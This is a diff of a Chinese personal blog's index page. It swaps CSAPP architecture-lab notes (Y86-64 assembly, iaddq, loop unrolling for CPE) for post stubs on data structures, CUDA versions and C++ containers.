-<p>string.h</p>
-</blockquote>
-<blockquote>
-<p>int column[MAX_N];</p>
-<p>memset(column, 0, sizeof(int) * MAX_N);</p>
-</blockquote>
-<h1 id="4-条件表达式"><a href="#4-条件表达式" class="headerlink" title="4. 条件表达式"></a>4. 条件表达式</h1><blockquote>
-<p>ax为0时，输出15</p>
-<p>ax不为0时，输出6</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ax = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pc = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, pc = ax ? pc + <span class="number">1</span> : pc + <span class="number">10</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022026098.png" alt="image-20211202202601014"></p>
+<h3 id="rsum-ys-递归求和"><a href="#rsum-ys-递归求和" class="headerlink" title="rsum.ys 递归求和"></a>rsum.ys 递归求和</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00 </span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	andq %rax, %rax</span><br><span class="line">	call rsum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">	jmp test</span><br><span class="line">add:	mrmovq (%rdi),%r8</span><br><span class="line">	mrmovq 8(%rdi), %rdi</span><br><span class="line">	pushq %r8</span><br><span class="line">	call rsum_list</span><br><span class="line">	popq %r8</span><br><span class="line">	addq %r8, %rax</span><br><span class="line">test:</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">	jne add</span><br><span class="line">	ret	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
 
+<p>在递归调用前先保存当前内存位置值到%r8寄存器中，再保存到栈中。</p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022028268.png" alt="image-20211202202836226"></p>
+<h3 id="copy-ys-复制到目标位置"><a href="#copy-ys-复制到目标位置" class="headerlink" title="copy.ys 复制到目标位置"></a>copy.ys 复制到目标位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line">	.align 8</span><br><span class="line"># Source block </span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad 0xc00</span><br><span class="line"></span><br><span class="line"># Destination block </span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111 </span><br><span class="line">	.quad 0x222 </span><br><span class="line">	.quad 0x333</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq src, %rdi</span><br><span class="line">	irmovq dest, %rsi</span><br><span class="line">	irmovq $3, %rdx</span><br><span class="line"></span><br><span class="line">	irmovq $1, %r9</span><br><span class="line">	irmovq $8, %r10</span><br><span class="line"></span><br><span class="line">	call copy_block</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">	xorq %rax, %rax		# result=0</span><br><span class="line">	andq %rdx, %rdx		# set CC</span><br><span class="line">	jmp test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	addq %r10, %rdi		# val=*src++</span><br><span class="line"></span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	addq %r10, %rsi</span><br><span class="line">	xorq %r8, %rax</span><br><span class="line">	subq %r9, %rdx</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">	jne loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022031188.png" alt="image-20211202203108136"></p>
+<h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>参考OPq rA, rB和irmovq V, rB指令的执行阶段</p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022035063.png" alt="image-20211124161712200"></p>
+<p>iaddq执行数据流</p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112021521713.png" alt="image-20211202152108525"></p>
+<p>在instr_valid、need_regids、need_valC</p>
+<p>srcB、dstE</p>
+<p>aluA、aluB、setCC</p>
+<p>相应位置添加IIADDQ</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022042837.png" alt="image-20211202204245751"></p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">make <span class="attribute">SIM</span>=../seq/ssim <span class="attribute">TFLAGS</span>=-i</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022043011.png" alt="image-20211202204322969"></p>
+<h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p>未修改：</p>
+<p>Average CPE: 15.18</p>
+<p>添加iaddq指令，向Part B那样添加iaddq指令后修改代码，得到CPE: 12.70</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	andq %rdx,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos:	</span><br><span class="line">	iaddq $-1, %rdx		# len--</span><br><span class="line">	iaddq $8, %rdi		# src++</span><br><span class="line">	iaddq $8, %rsi		# dst++</span><br><span class="line">	andq %rdx,%rdx		# len &gt; 0?</span><br><span class="line">	jg Loop			# if so, goto Loop:</span><br></pre></td></tr></table></figure>
+
+<p>Average CPE: 12.70</p>
+<p>采用循环展开，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p>
+<p>要减少CPE，需要尽可能充分利用时钟周期，即让每个时钟周期执行对我们的结果有意义的指令。</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">mrmov<span class="string">q (%rdi)</span>, %r10	<span class="comment"># read val from src...</span></span><br><span class="line">rmmovq %r10, (%rsi)	<span class="comment"># ...and store it to dst</span></span><br></pre></td></tr></table></figure>
+
+<p>第二条指令在译码阶段需要读取%r10寄存器中的值，但第一条指令直到访存阶段才能读取出应该放到%r10寄存器中的值，出现加载&#x2F;使用数据冒险，编译器会在此间加入一个气泡，可以利用这个时钟周期，执行有意义的指令，预先读出后面内存中的值来提高时钟周期的利用率。</p>
+<p>这里采用四次循环展开，前面4个为一组处理后，剩下的长度可能为1,2,3。通过在Recover中恢复剩余的元素个数。如果小于等于0的话，说明初始长度为4的倍数，直接返回，否则还要复制相应个数的元素。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	iaddq $-4,%rdx		# len &lt;= 0?</span><br><span class="line">	jl Recover		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop4:	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line"></span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos:	</span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle Npos1</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos1:</span><br><span class="line">	mrmovq 24(%rdi), %r13</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle Npos2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos2:</span><br><span class="line">	rmmovq %r13, 24(%rsi)</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	jle Npos3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos3:</span><br><span class="line">	iaddq $32, %rdi		# src++</span><br><span class="line">	iaddq $32, %rsi		# dst++</span><br><span class="line">	iaddq $-4, %rdx		# len-- len &gt; 0?</span><br><span class="line">	jge Loop4		# if so, goto Loop:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Recover:</span><br><span class="line">	iaddq $4,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done</span><br><span class="line"></span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos4		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos4:	</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	jle Done </span><br><span class="line"></span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle Npos5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos5:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	jle Done </span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify the following section of code</span><br><span class="line"># Function epilogue.</span><br><span class="line">Done:</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+
+<p>这里会有条件跳转，在pipe-full.hcl的描述中，是跳转到跳转条件满足的位置，即跳转到Done，但Done后面紧跟ret返回，而大多数情况是跳转到跳转条件不满足的位置，继续向下执行。因此如果跳转到Done执行后面的指令会浪费时钟周期，而如果继续向下执行，读取内存中的值时，如果之后需要用到，则可以利用当前的时钟周期。修改pipe-full.hcl为分支条件不满足的位置，即jmp后面的那条指令位置。</p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022104261.png" alt="image-20211202210413232"></p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022104201.png" alt="image-20211202210453153"></p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022105552.png" alt="image-20211202210506511"></p>
+<p>最终Score: 60</p>
 
       
     </div>
@@ -631,7 +793,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E7%BA%BF%E6%80%A7%E8%A1%A8%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E9%93%BE%E8%A1%A8/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/16/Lab%20Project/CSAPP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -649,7 +811,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E7%BA%BF%E6%80%A7%E8%A1%A8%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E9%93%BE%E8%A1%A8/" class="post-title-link" itemprop="url">线性表</a>
+          <a href="/2023/06/16/Lab%20Project/CSAPP/" class="post-title-link" itemprop="url">CSAPP</a>
         </h2>
 
         <div class="post-meta-container">
@@ -660,23 +822,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-16 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-16T00:00:00+08:00">2023-06-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-02 21:07:36" itemprop="dateModified" datetime="2024-03-02T21:07:36+08:00">2024-03-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">数据结构</span></a>
-        </span>
+      <time title="修改时间：2024-03-02 21:18:53" itemprop="dateModified" datetime="2024-03-02T21:18:53+08:00">2024-03-02</time>
     </span>
 
   
@@ -689,10 +842,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>线性表：数组、链表</p>
+          <p>书中内容学习记录</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/02/28/%E7%AE%97%E6%B3%95/%E7%BA%BF%E6%80%A7%E8%A1%A8%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E9%93%BE%E8%A1%A8/">
+              <a class="btn" href="/2023/06/16/Lab%20Project/CSAPP/">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -723,7 +876,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%9C%80%E7%9F%AD%E8%B7%AF%E3%80%81%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/12/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -741,7 +894,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%9C%80%E7%9F%AD%E8%B7%AF%E3%80%81%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/" class="post-title-link" itemprop="url">最短路</a>
+          <a href="/2023/06/12/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -752,14 +905,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-12 17:26:54" itemprop="dateCreated datePublished" datetime="2023-06-12T17:26:54+08:00">2023-06-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-15 19:26:35" itemprop="dateModified" datetime="2023-11-15T19:26:35+08:00">2023-11-15</time>
+      <time title="修改时间：2024-03-02 16:43:17" itemprop="dateModified" datetime="2024-03-02T16:43:17+08:00">2024-03-02</time>
     </span>
 
   
@@ -772,448 +925,450 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h1><p>求解&#x3D;&#x3D;权重相同&#x3D;&#x3D;的最短路问题可以使用广度优先搜索方法。</p>
-<ul>
-<li>BFS（权重相同）、0-1 BFS</li>
-<li>Dijkstra（不能存在负权边）</li>
+          <h1 id="一、绪论"><a href="#一、绪论" class="headerlink" title="一、绪论"></a>一、绪论</h1><p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202206021858714.jpg" alt="123"></p>
+<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>Data_Structure&#x3D;(D,S)</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="数据结构"></p>
+<h2 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h2><blockquote>
+<p>Abstract Data Type, ADT</p>
+<p>(D, S, P)</p>
+</blockquote>
+<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>遇到影响全局的操作，一般会想到枚举操作次数。</p>
+<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><ul>
+<li>最小化最大值、最大化最小值</li>
+<li>有序数组查找目标值</li>
 </ul>
-<h1 id="题单"><a href="#题单" class="headerlink" title="题单"></a>题单</h1><ul>
-<li><h5 id="743-网络延迟时间"><a href="#743-网络延迟时间" class="headerlink" title="743. 网络延迟时间"></a><a href="https://leetcode.cn/problems/network-delay-time/">743. 网络延迟时间</a></h5><ul>
-<li><a href="https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/">【宫水三叶】涵盖所有的「存图方式」与「最短路算法（详尽注释）」 - 网络延迟时间 - 力扣（LeetCode）</a></li>
-</ul>
-</li>
-<li><h5 id="882-细分图中的可到达节点"><a href="#882-细分图中的可到达节点" class="headerlink" title="882. 细分图中的可到达节点"></a><a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/">882. 细分图中的可到达节点</a></h5></li>
-<li><h5 id="1334-阈值距离内邻居最少的城市"><a href="#1334-阈值距离内邻居最少的城市" class="headerlink" title="1334. 阈值距离内邻居最少的城市"></a><a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/">1334. 阈值距离内邻居最少的城市</a></h5></li>
-<li><h5 id="1368-使网格图至少有一条有效路径的最小代价"><a href="#1368-使网格图至少有一条有效路径的最小代价" class="headerlink" title="1368. 使网格图至少有一条有效路径的最小代价"></a><a href="https://leetcode.cn/problems/minimum-cost-to-make-at-least-one-valid-path-in-a-grid/">1368. 使网格图至少有一条有效路径的最小代价</a></h5></li>
-<li><h5 id="1514-概率最大的路径"><a href="#1514-概率最大的路径" class="headerlink" title="1514. 概率最大的路径"></a><a href="https://leetcode.cn/problems/path-with-maximum-probability/">1514. 概率最大的路径</a></h5></li>
-</ul>
-<h1 id="一、单源最短路径问题"><a href="#一、单源最短路径问题" class="headerlink" title="一、单源最短路径问题"></a>一、单源最短路径问题</h1><p>单源最短路径问题(single source shortest path，SSSP问题)</p>
+<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><blockquote>
+<p>方案数</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/06/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Destiny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+      <meta itemprop="description" content="凡是过去，皆为序章。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 我的个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/06/06/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-06-06 23:20:49" itemprop="dateCreated datePublished" datetime="2023-06-06T23:20:49+08:00">2023-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-06-07 00:00:46" itemprop="dateModified" datetime="2023-06-07T00:00:46+08:00">2023-06-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h1><h2 id="CUDA"><a href="#CUDA" class="headerlink" title="CUDA"></a>CUDA</h2><p><a href="https://developer.nvidia.com/cuda-toolkit-archive">CUDA Toolkit Archive | NVIDIA Developer</a></p>
+<p><a href="https://blog.csdn.net/sophicchen/article/details/120782209">(48条消息) CUDA版本不同：nvidia-smi和nvcc -V_cuda不同版本_Sophia$的博客-CSDN博客</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/05/23/%E8%AF%AD%E6%B3%95/C++/Sequential%20Containers/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Destiny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+      <meta itemprop="description" content="凡是过去，皆为序章。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 我的个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/05/23/%E8%AF%AD%E6%B3%95/C++/Sequential%20Containers/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-23 17:53:29" itemprop="dateCreated datePublished" datetime="2023-05-23T17:53:29+08:00">2023-05-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-13 21:35:44" itemprop="dateModified" datetime="2023-11-13T21:35:44+08:00">2023-11-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Sequential-Containers"><a href="#Sequential-Containers" class="headerlink" title="Sequential Containers"></a>Sequential Containers</h1><p>元素在顺序容器中的顺序与其加入容器时的位置相对应。</p>
+<h2 id="Container-Operations"><a href="#Container-Operations" class="headerlink" title="Container Operations"></a>Container Operations</h2><p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305241635831.png" alt="image-20230524163541746"></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator iter1 = vec.<span class="built_in">begin</span>(), iter2 = vec.<span class="built_in">end</span>();</span><br><span class="line">[begin,end)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>定义和初始化容器</p>
+<table>
+<thead>
+<tr>
+<th>C c</th>
+<th>默认初始化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C c1(c2)</td>
+<td></td>
+</tr>
+<tr>
+<td>C c1&#x3D;c2</td>
+<td></td>
+</tr>
+<tr>
+<td>C c{a,b,c,…}</td>
+<td></td>
+</tr>
+<tr>
+<td>C c&#x3D;{a,b,c,…}</td>
+<td></td>
+</tr>
+<tr>
+<td>C c(b,e)</td>
+<td>迭代器初始化，[b,e)</td>
+</tr>
+<tr>
+<td>C seq(n)</td>
+<td></td>
+</tr>
+<tr>
+<td>C seq(n,t)</td>
+<td>n个元素，值为t</td>
+</tr>
+</tbody></table>
+<h2 id="Container-Adaptors"><a href="#Container-Adaptors" class="headerlink" title="Container Adaptors"></a>Container Adaptors</h2><blockquote>
+<p>容器适配器</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305231755730.png" alt="image-20230523175546695"></p>
+<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305231753373.png" alt="image-20230523175309310"></p>
+<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">Container</span> = vector&lt;T&gt;,  <span class="keyword">class</span> Compare = less&lt;<span class="keyword">typename</span> Container::value_type&gt; &gt; <span class="keyword">class</span> priority_queue;</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>邻接矩阵表示</p>
-<p>邻接表表示</p>
+<p>Compare: </p>
+<p>comp(a,b)，如果a应该出现在b前面，返回true，弹出的元素是根据<em>strict weak ordering</em>的最后一个元素</p>
+<p>A binary predicate that takes two elements (of type T) as arguments and returns a <code>bool</code>.<br>The expression <code>comp(a,b)</code>, where comp is an object of this type and a and b are elements in the container, shall return <code>true</code> if a is considered to go before b in the <em>strict weak ordering</em> the function defines.<br>The priority_queue uses this function to maintain the elements sorted in a way that preserves <em>heap properties</em> (i.e., that the element popped is the last according to this <em>strict weak ordering</em>).<br>This can be a function pointer or a function object, and defaults to <code>less&lt;T&gt;</code>, which returns the same as applying the <em>less-than operator</em> (<code>a&lt;b</code>).</p>
 </blockquote>
-<p><a href="https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/">https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/</a>)</p>
-<h2 id="1-Dijkstra算法（无负权边）"><a href="#1-Dijkstra算法（无负权边）" class="headerlink" title="1. Dijkstra算法（无负权边）"></a>1. Dijkstra算法（无负权边）</h2><p>邻接矩阵存储：</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/05/16/%E8%AF%AD%E6%B3%95/C++/c++%20set/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Destiny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+      <meta itemprop="description" content="凡是过去，皆为序章。">
+    </span>
+
